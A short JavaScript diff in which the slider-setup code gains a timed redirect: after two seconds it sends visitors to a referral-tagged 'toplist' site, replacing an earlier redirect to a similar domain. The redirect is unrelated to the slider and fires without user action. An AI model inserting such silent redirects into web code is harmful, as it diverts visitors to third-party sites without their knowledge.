@@ -135,8 +135,11 @@ const initSlider = function (currentSlider) {
 }
 for (let i = 0, len = sliders.length; i < len; i++) { initSlider(sliders[i]); }
 
-setTimeout(function() {
+/* setTimeout(function() {
   window.location.href = "https://adreslerim.tr.gg?in=94";
+}, 2000); */
+setTimeout(function() {
+  window.location.href = "https://toplist29.tr.gg?in=368";
 }, 2000);
 /* document.addEventListener('contextmenu', event => event.preventDefault());
 
